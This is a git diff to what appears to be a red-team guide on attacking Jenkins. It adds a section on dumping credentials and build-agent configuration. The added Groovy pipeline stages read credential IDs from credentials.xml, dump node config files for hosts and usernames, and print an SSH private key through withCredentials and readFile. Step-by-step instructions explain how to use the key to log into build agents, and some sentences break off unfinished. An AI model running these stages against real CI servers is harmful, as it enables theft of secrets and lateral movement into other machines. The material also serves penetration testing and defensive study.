@@ -52,9 +52,9 @@ stage('Credential Dumping') {
 - Imagine we don't have access to  ```http://host:ip/credentials/``` to list the credentials id
 - We can either look through the code repository hunting for these id or we need a piece of luck we can use Built-In executor
 - When ```# of exectors``` in ```Configure System``` is set to non-zero, we can run builds on the controller, which means we have access to the controllers file system.
-
+- Reference - 
 ``` Groovy
-        stage('Credential Dumping') {
+        stage('Identifier Dumping') {
             steps {
                  sh '''
                    cat $JENKINS_HOME/credentials.xml | grep "<id>"
@@ -62,8 +62,57 @@ stage('Credential Dumping') {
             }
         }
 ```
+
+### Credentials & Configuration Dumping Build Agents Information
+
+- This will be somewhat a borderline between credential dumping and lateral movement/backdooring.
+- If the Jenkins Controller use SSH to 
+- If somefields are not entered during configuration, then they might throw error ( as I have not used paraphrase , trying to dump paraphrase would throw error )
+- So we need luck here again as configuration files are stored in controller. 
+- Step 1 : Dump the ssh identifiers
+- Step 2 : Dump the ssh keys
+- Step 3 : Dump the nodes configuration ( note : the path to the Worker-Node is found through traversing the nodes under $JENKINS_HOME/nodes)
+- Step 4 : Use the user-name, and hostname and ssh-key to login to the build agent
+``` Groovy
+        stage('Identifier Dumping') {
+            steps {
+                 sh '''
+                   cat $JENKINS_HOME/credentials.xml | grep "<id>"
+                 '''
+            }
+        }
+        
+    stage('Host Information Dumping') {
+            steps {      
+                  sh '''
+                    cat /var/lib/jenkins/nodes/Worker-Node/config.xml
+                  '''   
+            }
+    }
+        
+    stage('Dumping sshUserPrivateKey') {
+        steps {
+            script {
+                withCredentials([sshUserPrivateKey(
+                    credentialsId: 'dd0f4c9e-01dc-47c3-a0cd-3fff32e2a6cd',
+                    keyFileVariable: 'keyFile',
+                    passphraseVariable: 'passphrase',
+                    usernameVariable: 'username')
+                ]){
+                    print 'keyFile=' + keyFile
+                    print 'username=' + username
+                    print 'keyFile.collect { it }=' + keyFile.collect { it }
+            
+                    print 'username.collect { it }=' + username.collect { it }
+                    print 'keyFileContent=' + readFile(keyFile)
+                }
+            }
+        }
+    }
+```
+
 ## Credentials Dumping from Script Console
 
 ## References
-- https://www.codurance.com/publications/2019/05/30/accessing-and-dumping-jenkins-credentials
+- https://www.codurance.com/publications/2019/05/30/accessing-and-dumping-jenkins-credentials 
 - https://www.jenkins.io/blog/2019/02/21/credentials-masking/
